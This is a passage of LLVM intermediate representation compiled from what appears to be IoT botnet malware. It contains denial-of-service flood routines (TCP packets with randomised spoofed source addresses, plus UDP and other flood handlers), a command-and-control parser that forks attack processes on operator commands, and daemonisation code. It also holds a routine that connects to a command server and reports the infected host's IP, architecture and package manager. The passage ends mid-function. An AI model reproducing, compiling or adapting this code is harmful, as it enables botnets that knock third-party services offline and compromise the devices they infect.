  %111 = load i16, i16* %110, align 2
  %112 = zext i16 %111 to i32
  %113 = call zeroext i16 @csum(i16* nonnull %108, i32 %112)
  %114 = getelementptr inbounds i8, i8* %39, i64 10
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %117 = add nsw i32 %116, %2
  %118 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %119 = getelementptr inbounds i8, i8* %39, i64 12
  %120 = bitcast i8* %119 to i32*
  %121 = getelementptr inbounds i8, i8* %39, i64 4
  %122 = bitcast i8* %121 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %102
  %.0 = phi i32 [ 0, %102 ], [ %.0.be, %.backedge.backedge ]
  %123 = call i64 @sendto(i32 %26, i8* nonnull %39, i64 %37, i32 0, %struct.sockaddr* nonnull %118, i32 16) #7
  %124 = call i32 @getRandomIP(i32 %.074)
  %125 = call i32 @htonl(i32 %124) #14
  store i32 %125, i32* %120, align 4
  %126 = call i32 @rand_cmwc()
  %127 = trunc i32 %126 to i16
  store i16 %127, i16* %122, align 4
  %128 = call i32 @rand_cmwc()
  store i32 %128, i32* %53, align 8
  %129 = call i32 @rand_cmwc()
  %130 = trunc i32 %129 to i16
  store i16 %130, i16* %50, align 4
  store i16 0, i16* %93, align 4
  %131 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %131, i16* %93, align 4
  %132 = load i16, i16* %110, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %108, i32 %133)
  store i16 %134, i16* %115, align 2
  %135 = icmp eq i32 %.0, %6
  br i1 %135, label %136, label %139

; <label>:136:                                    ; preds = %.backedge
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %138 = icmp sgt i32 %137, %117
  br i1 %138, label %141, label %.backedge.backedge

; <label>:139:                                    ; preds = %.backedge
  %140 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %139, %136
  %.0.be = phi i32 [ %140, %139 ], [ 0, %136 ]
  br label %.backedge

; <label>:141:                                    ; preds = %136
  call void @llvm.stackrestore(i8* %38)
  br label %142

; <label>:142:                                    ; preds = %23, %18, %28, %141
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: noinline noreturn nounwind uwtable
define void @astd(i8*, i32, i32, i32) local_unnamed_addr #10 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca [1 x i8*], align 8
  %7 = tail call i32 @socket(i32 2, i32 2, i32 0) #7
  %8 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %9 = sext i32 %8 to i64
  %10 = tail call %struct.hostent* @gethostbyname(i8* %0) #7
  %11 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %11, i8 0, i64 16, i32 4, i1 false)
  %12 = getelementptr inbounds %struct.hostent, %struct.hostent* %10, i64 0, i32 4
  %13 = load i8**, i8*** %12, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %16 = bitcast %struct.in_addr* %15 to i8*
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %10, i64 0, i32 3
  %18 = load i32, i32* %17, align 4
  %19 = sext i32 %18 to i64
  call void @bcopy(i8* %14, i8* %16, i64 %19) #7
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %10, i64 0, i32 2
  %21 = load i32, i32* %20, align 8
  %22 = trunc i32 %21 to i16
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 %22, i16* %23, align 4
  %24 = trunc i32 %1 to i16
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = bitcast [1 x i8*]* %6 to i8*
  %27 = sext i32 %3 to i64
  %28 = getelementptr inbounds [1 x i8*], [1 x i8*]* %6, i64 0, i64 0
  %29 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %30 = sext i32 %2 to i64
  %31 = add nsw i64 %9, %30
  br label %32

; <label>:32:                                     ; preds = %42, %4
  %.0 = phi i32 [ 0, %4 ], [ %43, %42 ]
  store i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.11, i64 0, i64 0), i8** %28, align 8
  %33 = icmp ugt i32 %.0, 49
  br i1 %33, label %34, label %42

; <label>:34:                                     ; preds = %32
  %35 = call i64 @send(i32 %7, i8* nonnull %26, i64 %27, i32 0) #7
  %36 = call i32 @connect(i32 %7, %struct.sockaddr* nonnull %29, i32 16) #7
  %37 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %38 = sext i32 %37 to i64
  %39 = icmp slt i64 %38, %31
  br i1 %39, label %42, label %40

; <label>:40:                                     ; preds = %34
  %41 = call i32 @close(i32 %7) #7
  call void @_exit(i32 0) #16
  unreachable

; <label>:42:                                     ; preds = %34, %32
  %.1 = phi i32 [ %.0, %32 ], [ 0, %34 ]
  %43 = add i32 %.1, 1
  br label %32
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #11

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @defarchs() local_unnamed_addr #12 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i64 0, i64 0)
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @defopsys() local_unnamed_addr #12 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i64 0, i64 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @defpkgs() local_unnamed_addr #1 {
  %1 = tail call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.14, i64 0, i64 0), i32 0) #7
  %2 = icmp eq i32 %1, -1
  br i1 %2, label %3, label %21

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.16, i64 0, i64 0), i32 0) #7
  %5 = icmp eq i32 %4, -1
  br i1 %5, label %6, label %21

; <label>:6:                                      ; preds = %3
  %7 = tail call i32 @access(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.18, i64 0, i64 0), i32 0) #7
  %8 = icmp eq i32 %7, -1
  br i1 %8, label %9, label %21

; <label>:9:                                      ; preds = %6
  %10 = tail call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.20, i64 0, i64 0), i32 0) #7
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %12, label %21

; <label>:12:                                     ; preds = %9
  %13 = tail call i32 @access(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i64 0, i64 0), i32 0) #7
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %21

; <label>:15:                                     ; preds = %12
  %16 = tail call i32 @access(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i64 0, i64 0), i32 0) #7
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %21

; <label>:18:                                     ; preds = %15
  %19 = tail call i32 @access(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i64 0, i64 0), i32 0) #7
  %20 = icmp eq i32 %19, -1
  %. = select i1 %20, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.28, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.27, i64 0, i64 0)
  br label %21

; <label>:21:                                     ; preds = %18, %15, %12, %9, %6, %3, %0
  %.0 = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i64 0, i64 0), %0 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i64 0, i64 0), %3 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.19, i64 0, i64 0), %6 ], [ getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i64 0, i64 0), %9 ], [ getelementptr inbounds ([8 x i8], [8 x i8]* @.str.23, i64 0, i64 0), %12 ], [ getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i64 0, i64 0), %15 ], [ %., %18 ]
  ret i8* %.0
}

; Function Attrs: nounwind
declare i32 @access(i8* nocapture readonly, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @cncinput(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.29, i64 0, i64 0)) #15
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %67

; <label>:6:                                      ; preds = %2
  %7 = icmp slt i32 %0, 6
  br i1 %7, label %.loopexit, label %8

; <label>:8:                                      ; preds = %6
  %9 = getelementptr inbounds i8*, i8** %1, i64 3
  %10 = load i8*, i8** %9, align 8
  %11 = tail call i32 @atoi(i8* %10) #15
  %12 = icmp eq i32 %11, -1
  br i1 %12, label %.loopexit, label %13

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds i8*, i8** %1, i64 2
  %15 = load i8*, i8** %14, align 8
  %16 = tail call i32 @atoi(i8* %15) #15
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %.loopexit, label %18

; <label>:18:                                     ; preds = %13
  %19 = getelementptr inbounds i8*, i8** %1, i64 4
  %20 = load i8*, i8** %19, align 8
  %21 = tail call i32 @atoi(i8* %20) #15
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %.loopexit, label %23

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds i8*, i8** %1, i64 5
  %25 = load i8*, i8** %24, align 8
  %26 = tail call i32 @atoi(i8* %25) #15
  %27 = icmp eq i32 %26, -1
  %28 = icmp sgt i32 %26, 65500
  %29 = or i1 %28, %27
  %30 = icmp sgt i32 %21, 32
  %or.cond102 = or i1 %30, %29
  br i1 %or.cond102, label %.loopexit, label %31

; <label>:31:                                     ; preds = %23
  %32 = icmp eq i32 %0, 7
  br i1 %32, label %33, label %38

; <label>:33:                                     ; preds = %31
  %34 = getelementptr inbounds i8*, i8** %1, i64 6
  %35 = load i8*, i8** %34, align 8
  %36 = tail call i32 @atoi(i8* %35) #15
  %37 = icmp slt i32 %36, 1
  br i1 %37, label %.loopexit, label %38

; <label>:38:                                     ; preds = %33, %31
  %39 = getelementptr inbounds i8*, i8** %1, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = load i8*, i8** %14, align 8
  %42 = tail call i32 @atoi(i8* %41) #15
  %43 = load i8*, i8** %9, align 8
  %44 = tail call i32 @atoi(i8* %43) #15
  %45 = load i8*, i8** %19, align 8
  %46 = tail call i32 @atoi(i8* %45) #15
  %47 = load i8*, i8** %24, align 8
  %48 = tail call i32 @atoi(i8* %47) #15
  %49 = icmp sgt i32 %0, 6
  br i1 %49, label %50, label %54

; <label>:50:                                     ; preds = %38
  %51 = getelementptr inbounds i8*, i8** %1, i64 6
  %52 = load i8*, i8** %51, align 8
  %53 = tail call i32 @atoi(i8* %52) #15
  br label %54

; <label>:54:                                     ; preds = %38, %50
  %55 = phi i32 [ %53, %50 ], [ 1000, %38 ]
  %strchr = tail call i8* @strchr(i8* %40, i32 44)
  %56 = icmp eq i8* %strchr, null
  br i1 %56, label %63, label %.preheader.preheader

.preheader.preheader:                             ; preds = %54
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %59
  %.sink = phi i8* [ null, %59 ], [ %40, %.preheader.preheader ]
  %57 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #7
  %58 = icmp eq i8* %57, null
  br i1 %58, label %.loopexit.loopexit, label %59

; <label>:59:                                     ; preds = %.preheader
  %60 = tail call i32 @listFork()
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %62, label %.preheader

; <label>:62:                                     ; preds = %59
  tail call void @audp(i8* nonnull %57, i32 %42, i32 %44, i32 %46, i32 %48, i32 %55)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:63:                                     ; preds = %54
  %64 = tail call i32 @listFork()
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %.loopexit

; <label>:66:                                     ; preds = %63
  tail call void @audp(i8* %40, i32 %42, i32 %44, i32 %46, i32 %48, i32 %55)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:67:                                     ; preds = %2
  %68 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.30, i64 0, i64 0)) #15
  %69 = icmp eq i32 %68, 0
  br i1 %69, label %70, label %136

; <label>:70:                                     ; preds = %67
  %71 = icmp slt i32 %0, 6
  br i1 %71, label %.loopexit, label %72

; <label>:72:                                     ; preds = %70
  %73 = getelementptr inbounds i8*, i8** %1, i64 3
  %74 = load i8*, i8** %73, align 8
  %75 = tail call i32 @atoi(i8* %74) #15
  %76 = icmp eq i32 %75, -1
  br i1 %76, label %.loopexit, label %77

; <label>:77:                                     ; preds = %72
  %78 = getelementptr inbounds i8*, i8** %1, i64 2
  %79 = load i8*, i8** %78, align 8
  %80 = tail call i32 @atoi(i8* %79) #15
  %81 = icmp eq i32 %80, -1
  br i1 %81, label %.loopexit, label %82

; <label>:82:                                     ; preds = %77
  %83 = getelementptr inbounds i8*, i8** %1, i64 4
  %84 = load i8*, i8** %83, align 8
  %85 = tail call i32 @atoi(i8* %84) #15
  %86 = icmp eq i32 %85, -1
  %87 = icmp sgt i32 %85, 32
  %or.cond103 = or i1 %86, %87
  br i1 %or.cond103, label %.loopexit, label %88

; <label>:88:                                     ; preds = %82
  %89 = icmp sgt i32 %0, 6
  br i1 %89, label %90, label %.thread

; <label>:90:                                     ; preds = %88
  %91 = getelementptr inbounds i8*, i8** %1, i64 6
  %92 = load i8*, i8** %91, align 8
  %93 = tail call i32 @atoi(i8* %92) #15
  %94 = icmp slt i32 %93, 0
  br i1 %94, label %.loopexit, label %95

; <label>:95:                                     ; preds = %90
  %96 = icmp eq i32 %0, 8
  br i1 %96, label %97, label %.thread

; <label>:97:                                     ; preds = %95
  %98 = getelementptr inbounds i8*, i8** %1, i64 7
  %99 = load i8*, i8** %98, align 8
  %100 = tail call i32 @atoi(i8* %99) #15
  %101 = icmp slt i32 %100, 1
  br i1 %101, label %.loopexit, label %.thread

.thread:                                          ; preds = %88, %97, %95
  %102 = phi i1 [ true, %97 ], [ false, %95 ], [ false, %88 ]
  %103 = getelementptr inbounds i8*, i8** %1, i64 1
  %104 = load i8*, i8** %103, align 8
  %105 = load i8*, i8** %78, align 8
  %106 = tail call i32 @atoi(i8* %105) #15
  %107 = load i8*, i8** %73, align 8
  %108 = tail call i32 @atoi(i8* %107) #15
  %109 = load i8*, i8** %83, align 8
  %110 = tail call i32 @atoi(i8* %109) #15
  %111 = getelementptr inbounds i8*, i8** %1, i64 5
  %112 = load i8*, i8** %111, align 8
  br i1 %102, label %113, label %117

; <label>:113:                                    ; preds = %.thread
  %114 = getelementptr inbounds i8*, i8** %1, i64 7
  %115 = load i8*, i8** %114, align 8
  %116 = tail call i32 @atoi(i8* %115) #15
  br label %117

; <label>:117:                                    ; preds = %.thread, %113
  %118 = phi i32 [ %116, %113 ], [ 10, %.thread ]
  br i1 %89, label %119, label %123

; <label>:119:                                    ; preds = %117
  %120 = getelementptr inbounds i8*, i8** %1, i64 6
  %121 = load i8*, i8** %120, align 8
  %122 = tail call i32 @atoi(i8* %121) #15
  br label %123

; <label>:123:                                    ; preds = %117, %119
  %124 = phi i32 [ %122, %119 ], [ 0, %117 ]
  %strchr99 = tail call i8* @strchr(i8* %104, i32 44)
  %125 = icmp eq i8* %strchr99, null
  br i1 %125, label %132, label %.preheader106.preheader

.preheader106.preheader:                          ; preds = %123
  br label %.preheader106

.preheader106:                                    ; preds = %.preheader106.preheader, %128
  %.sink104 = phi i8* [ null, %128 ], [ %104, %.preheader106.preheader ]
  %126 = tail call i8* @strtok(i8* %.sink104, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #7
  %127 = icmp eq i8* %126, null
  br i1 %127, label %.loopexit.loopexit133, label %128

; <label>:128:                                    ; preds = %.preheader106
  %129 = tail call i32 @listFork()
  %130 = icmp eq i32 %129, 0
  br i1 %130, label %131, label %.preheader106

; <label>:131:                                    ; preds = %128
  tail call void @atcp(i8* nonnull %126, i32 %106, i32 %108, i32 %110, i8* %112, i32 %124, i32 %118)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:132:                                    ; preds = %123
  %133 = tail call i32 @listFork()
  %134 = icmp eq i32 %133, 0
  br i1 %134, label %135, label %.loopexit

; <label>:135:                                    ; preds = %132
  tail call void @atcp(i8* %104, i32 %106, i32 %108, i32 %110, i8* %112, i32 %124, i32 %118)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:136:                                    ; preds = %67
  %137 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.31, i64 0, i64 0)) #15
  %138 = icmp eq i32 %137, 0
  br i1 %138, label %139, label %.loopexit111

; <label>:139:                                    ; preds = %136
  %140 = icmp slt i32 %0, 4
  br i1 %140, label %.loopexit, label %141

; <label>:141:                                    ; preds = %139
  %142 = getelementptr inbounds i8*, i8** %1, i64 2
  %143 = load i8*, i8** %142, align 8
  %144 = tail call i32 @atoi(i8* %143) #15
  %145 = icmp slt i32 %144, 1
  br i1 %145, label %.loopexit, label %146

; <label>:146:                                    ; preds = %141
  %147 = getelementptr inbounds i8*, i8** %1, i64 3
  %148 = load i8*, i8** %147, align 8
  %149 = tail call i32 @atoi(i8* %148) #15
  %150 = icmp slt i32 %149, 1
  br i1 %150, label %.loopexit, label %151

; <label>:151:                                    ; preds = %146
  %152 = getelementptr inbounds i8*, i8** %1, i64 4
  %153 = load i8*, i8** %152, align 8
  %154 = tail call i32 @atoi(i8* %153) #15
  %155 = icmp slt i32 %154, 1
  br i1 %155, label %.loopexit, label %156

; <label>:156:                                    ; preds = %151
  %157 = getelementptr inbounds i8*, i8** %1, i64 1
  %158 = load i8*, i8** %157, align 8
  %strchr100 = tail call i8* @strchr(i8* %158, i32 44)
  %159 = icmp eq i8* %strchr100, null
  br i1 %159, label %166, label %.preheader110.preheader

.preheader110.preheader:                          ; preds = %156
  br label %.preheader110

.preheader110:                                    ; preds = %.preheader110.preheader, %162
  %.sink105 = phi i8* [ null, %162 ], [ %158, %.preheader110.preheader ]
  %160 = tail call i8* @strtok(i8* %.sink105, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #7
  %161 = icmp eq i8* %160, null
  br i1 %161, label %.loopexit111.loopexit, label %162

; <label>:162:                                    ; preds = %.preheader110
  %163 = tail call i32 @listFork()
  %164 = icmp eq i32 %163, 0
  br i1 %164, label %165, label %.preheader110

; <label>:165:                                    ; preds = %162
  tail call void @astd(i8* nonnull %160, i32 %144, i32 %149, i32 %154)
  unreachable

; <label>:166:                                    ; preds = %156
  %167 = tail call i32 @listFork()
  %168 = icmp eq i32 %167, 0
  br i1 %168, label %169, label %.loopexit

; <label>:169:                                    ; preds = %166
  tail call void @astd(i8* %158, i32 %144, i32 %149, i32 %154)
  unreachable

.loopexit111.loopexit:                            ; preds = %.preheader110
  br label %.loopexit111

.loopexit111:                                     ; preds = %.loopexit111.loopexit, %136
  %170 = load i8*, i8** %1, align 8
  %171 = tail call i32 @strcmp(i8* %170, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i64 0, i64 0)) #15
  %172 = icmp eq i32 %171, 0
  %173 = load i64, i64* @numpids, align 8
  %174 = icmp ne i64 %173, 0
  %or.cond = and i1 %172, %174
  br i1 %or.cond, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit111
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %187
  %.0116 = phi i64 [ %188, %187 ], [ 0, %.lr.ph.preheader ]
  %175 = load i32*, i32** @pids, align 8
  %176 = getelementptr inbounds i32, i32* %175, i64 %.0116
  %177 = load i32, i32* %176, align 4
  %178 = icmp eq i32 %177, 0
  br i1 %178, label %187, label %179

; <label>:179:                                    ; preds = %.lr.ph
  %180 = tail call i32 @getpid() #7
  %181 = icmp eq i32 %177, %180
  br i1 %181, label %187, label %182

; <label>:182:                                    ; preds = %179
  %183 = load i32*, i32** @pids, align 8
  %184 = getelementptr inbounds i32, i32* %183, i64 %.0116
  %185 = load i32, i32* %184, align 4
  %186 = tail call i32 @kill(i32 %185, i32 9) #7
  br label %187

; <label>:187:                                    ; preds = %179, %.lr.ph, %182
  %188 = add i64 %.0116, 1
  %189 = load i64, i64* @numpids, align 8
  %190 = icmp ult i64 %188, %189
  br i1 %190, label %.lr.ph, label %.loopexit.loopexit134

.loopexit.loopexit:                               ; preds = %.preheader
  br label %.loopexit

.loopexit.loopexit133:                            ; preds = %.preheader106
  br label %.loopexit

.loopexit.loopexit134:                            ; preds = %187
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit134, %.loopexit.loopexit133, %.loopexit.loopexit, %.loopexit111, %166, %132, %63, %139, %141, %146, %151, %70, %72, %77, %82, %90, %97, %6, %8, %13, %18, %23, %33
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [512 x i8], align 16
  %2 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 512, i32 16, i1 false)
  %3 = load i32, i32* @Demonicsock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #7
  store i32 0, i32* @Demonicsock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Demonserv, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #7
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #15
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #15
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 6982, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %21, i32* @Demonicsock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #6

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture readnone) local_unnamed_addr #10 {
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca [10 x i8*], align 16
  %6 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %7 = tail call i32 @getpid() #7
  %8 = xor i32 %7, %6
  tail call void @srand(i32 %8) #7
  %9 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %10 = tail call i32 @getpid() #7
  %11 = xor i32 %10, %9
  tail call void @init_rand(i32 %11)
  %12 = tail call i32 @getOurIP()
  %13 = tail call i32 @fork() #7
  %14 = icmp eq i32 %13, 0
  br i1 %14, label %17, label %15

; <label>:15:                                     ; preds = %2
  %16 = call i32 @waitpid(i32 %13, i32* nonnull %3, i32 0) #7
  call void @exit(i32 0) #16
  unreachable

; <label>:17:                                     ; preds = %2
  %18 = tail call i32 @fork() #7
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %21, label %20

; <label>:20:                                     ; preds = %17
  tail call void @exit(i32 0) #16
  unreachable

; <label>:21:                                     ; preds = %17
  %22 = tail call i32 @setsid() #7
  %23 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i64 0, i64 0)) #7
  %24 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %25 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 1
  %27 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 0
  br label %.backedge72

.backedge72.loopexit:                             ; preds = %.backedge
  br label %.backedge72.backedge

.backedge72:                                      ; preds = %.backedge72.backedge, %21
  %28 = call i32 @initConnection()
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %32, label %30

; <label>:30:                                     ; preds = %.backedge72
  %31 = call i32 @sleep(i32 5) #7
  br label %.backedge72.backedge

; <label>:32:                                     ; preds = %.backedge72
  %33 = load i32, i32* @Demonicsock, align 4
  %34 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %35 = call i8* @inet_ntoa(i32 %34) #7
  %36 = call i8* @defpkgs()
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %33, i8* getelementptr inbounds ([180 x i8], [180 x i8]* @.str.34, i64 0, i64 0), i8* %35, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i64 0, i64 0), i8* %36)
  %38 = load i32, i32* @Demonicsock, align 4
  %39 = call i32 @recvLine(i32 %38, i8* nonnull %25, i32 4096)
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %.backedge72.backedge, label %.preheader70.preheader

.backedge72.backedge:                             ; preds = %32, %30, %.backedge72.loopexit
  br label %.backedge72

.preheader70.preheader:                           ; preds = %32
  br label %.preheader70

.preheader70:                                     ; preds = %.preheader70.preheader, %.backedge
  %41 = phi i32 [ %140, %.backedge ], [ %39, %.preheader70.preheader ]
  %42 = load i64, i64* @numpids, align 8
  %43 = icmp eq i64 %42, 0
  br i1 %43, label %._crit_edge86, label %.lr.ph85.preheader

.lr.ph85.preheader:                               ; preds = %.preheader70
  br label %.lr.ph85

.lr.ph85:                                         ; preds = %.lr.ph85.preheader, %86
  %indvars.iv = phi i64 [ %indvars.iv.next, %86 ], [ 0, %.lr.ph85.preheader ]
  %44 = load i32*, i32** @pids, align 8
  %45 = getelementptr inbounds i32, i32* %44, i64 %indvars.iv
  %46 = load i32, i32* %45, align 4
  %47 = call i32 @waitpid(i32 %46, i32* null, i32 1) #7
  %48 = icmp sgt i32 %47, 0
  br i1 %48, label %.preheader, label %86

.preheader:                                       ; preds = %.lr.ph85
  %49 = add nuw i64 %indvars.iv, 1
  %50 = load i64, i64* @numpids, align 8
  %51 = icmp ult i64 %49, %50
  %52 = load i32*, i32** @pids, align 8
  %53 = trunc i64 %indvars.iv to i32
  br i1 %51, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %54 = trunc i64 %49 to i32
  %55 = trunc i64 %indvars.iv to i32
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %56 = phi i32* [ %65, %.lr.ph ], [ %52, %.lr.ph.preheader ]
  %57 = phi i64 [ %62, %.lr.ph ], [ %49, %.lr.ph.preheader ]
  %.06177 = phi i32 [ %.061, %.lr.ph ], [ %54, %.lr.ph.preheader ]
  %.061.in76 = phi i32 [ %.06177, %.lr.ph ], [ %55, %.lr.ph.preheader ]
  %58 = getelementptr inbounds i32, i32* %56, i64 %57
  %59 = load i32, i32* %58, align 4
  %60 = zext i32 %.061.in76 to i64
  %61 = getelementptr inbounds i32, i32* %56, i64 %60
  store i32 %59, i32* %61, align 4
  %.061 = add i32 %.06177, 1
  %62 = zext i32 %.061 to i64
  %63 = load i64, i64* @numpids, align 8
  %64 = icmp ult i64 %62, %63
  %65 = load i32*, i32** @pids, align 8
  br i1 %64, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.061.in.lcssa = phi i32 [ %53, %.preheader ], [ %.06177, %._crit_edge.loopexit ]
  %.lcssa = phi i32* [ %52, %.preheader ], [ %65, %._crit_edge.loopexit ]
  %66 = zext i32 %.061.in.lcssa to i64
